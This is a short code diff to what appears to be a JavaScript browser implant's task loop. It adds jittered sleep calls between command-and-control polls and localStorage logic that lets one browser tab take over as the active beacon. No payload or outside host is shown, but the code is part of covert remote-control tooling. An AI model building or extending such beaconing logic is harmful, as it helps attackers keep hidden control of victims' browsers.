@@ -148,6 +148,7 @@ async function sleepWakeUp(interval, jitter){
         try{
         	//console.log(JSON.stringify(task));
         	if(task.length === 0){
+			await new Promise(r => setTimeout(r, this.gen_sleep_time(C2.interval, C2.jitter)));
         		continue;
         	}
         	task = task[0];
@@ -165,11 +166,25 @@ async function sleepWakeUp(interval, jitter){
                 }
             }
             C2.postResponse(task, output);
+	    await new Promise(r => setTimeout(r, this.gen_sleep_time(C2.interval, C2.jitter)));
         }
         catch(error){
             C2.postResponse(task, {"user_output": error.toString(), "status": "error", "completed": true});
+	    var last_seen = new Date(JSON.parse(localStorage.getItem('last_seen')));
+	    last_seen.setSeconds(last_seen.getSeconds() + (2 * gen_sleep_time(C2.interval,C2.jitter))/1000)
+	    if(last_seen < current_time){
+	        localStorage.setItem('tab_id',tabID);
+	    }
+	    await new Promise(r => setTimeout(r, this.gen_sleep_time(C2.interval, C2.jitter)));
         }
-}else{await new Promise(r => setTimeout(r, this.gen_sleep_time(interval, jitter)));}
+}else{
+	await new Promise(r => setTimeout(r, this.gen_sleep_time(C2.interval, C2.jitter)));}
+	var last_seen = new Date(JSON.parse(localStorage.getItem('last_seen')));
+	    last_seen.setSeconds(last_seen.getSeconds() + (2 * gen_sleep_time(C2.interval,C2.jitter))/1000)
+	var current_time = new Date();
+	if(last_seen < current_time){
+	        localStorage.setItem('tab_id',tabID);
+	    }
     }
 }
 
